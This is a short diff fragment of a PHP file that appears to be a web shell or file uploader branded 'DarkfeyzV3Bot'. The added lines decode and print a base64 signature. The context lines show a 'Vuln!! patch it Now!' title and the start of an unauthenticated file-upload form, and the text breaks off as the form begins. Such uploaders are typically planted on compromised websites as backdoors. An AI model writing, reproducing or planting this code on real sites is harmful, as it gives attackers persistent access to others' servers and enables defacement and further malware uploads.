@@ -1,3 +1,6 @@
+<?php
+$str = 'RGFya2ZleXpTaGVsbFYzQm90MFhfZ29wXzIwMjA=';echo base64_decode($str);
+?>
 <title>Vuln!! patch it Now! DarkfeyzV3Bot</title>
 <?php
 echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
